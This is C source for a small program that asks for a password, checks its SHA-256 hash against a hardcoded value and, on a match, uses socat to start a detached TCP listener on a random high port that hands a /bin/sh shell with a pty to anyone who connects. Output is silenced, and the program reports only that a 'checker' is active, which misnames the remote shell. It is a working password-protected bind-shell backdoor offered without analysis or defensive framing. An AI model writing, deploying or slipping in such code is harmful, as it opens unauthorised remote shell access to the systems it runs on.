// gcc -static -o program program.c -lssl -lcrypto -I/usr/include/openssl -lz -lzstd
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <openssl/sha.h>

#define HASHED_PASSWORD "d886b3e9999b0d8aa51c6890b925544f66a1b061799816bb5780cec9aa8353df"

void sha256_string(const char* str, char* outputBuffer) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((const unsigned char*)str, strlen(str), hash);
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
    }
    outputBuffer[64] = 0;
}

int random_port() {
    return (rand() % 10000) + 10000; // range 10000-19999
}

int is_port_free(int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return 0;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    int result = bind(sockfd, (struct sockaddr*)&addr, sizeof(addr));
    close(sockfd);

    return result == 0;
}

int get_available_port() {
    int port;
    for (int i = 0; i < 100; i++) { // coba max 100x
        port = random_port();
        if (is_port_free(port)) {
            return port;
        }
    }
    return -1; // gagal cari port kosong
}

int main(int argc, char* argv[]) {
    srand(time(NULL));

    char input[100];
    char hashed[65];

    printf("Password: ");
    if (!fgets(input, sizeof(input), stdin)) {
        return 1;
    }

    input[strcspn(input, "\n")] = 0; // Remove newline
    sha256_string(input, hashed);

    if (strcmp(hashed, HASHED_PASSWORD) == 0) {
        int port = get_available_port();
        if (port == -1) {
            printf("No available port found!\n");
            return 1;
        }

        char cmd[256];
        snprintf(cmd, sizeof(cmd),
            "setsid socat TCP-LISTEN:%d,reuseaddr EXEC:/bin/sh,stderr,pty,cfmakeraw,echo=0 >/dev/null 2>&1 &",
            port);

        system(cmd);

        printf("checker active on port: %d\n", port);
    } else {
        printf("Access denied.\n");
    }

    return 0;
}
